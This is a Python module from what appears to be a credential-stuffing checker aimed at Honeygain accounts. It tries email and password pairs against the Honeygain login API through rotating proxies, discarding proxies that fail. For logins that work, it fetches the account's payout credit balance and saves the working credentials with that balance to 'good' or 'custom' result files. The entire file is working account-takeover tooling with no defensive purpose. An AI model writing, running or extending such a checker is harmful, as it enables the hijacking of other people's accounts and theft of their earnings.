from modules.variables import Checker
from requests import post,get
from modules.functions import bad_proxy, log,save,set_proxy


def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        payload = {"email":email,"password":password}
        header = {"Authorization":"Bearer "}
        try:
            a = post("https://dashboard.honeygain.com/api/v1/users/tokens",json=payload,proxies=set_proxy(proxy),timeout=Checker.timeout)
            if "Bad credentials." in a.text:
                retries += 1
            elif "access_token" in a.text:
                header["Authorization"] = "Bearer "+a.json()["data"]["access_token"]
                balance = get("https://dashboard.honeygain.com/api/v1/users/balances",headers=header,proxies=set_proxy(proxy),timeout=Checker.timeout).json()["data"]["payout"]["credits"]
                if not Checker.cui: 
                    log("good",email+":"+password,"Honeygain")
                if int(balance) > 0: 
                    save("Honeygain","good",Checker.time,email+":"+password+f" | Credits: {balance}")
                    Checker.good += 1
                else: 
                    save("Honeygain","custom",Checker.time,email+":"+password+f" | Credits: {balance}")
                    Checker.custom += 1
                Checker.cpm += 1
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return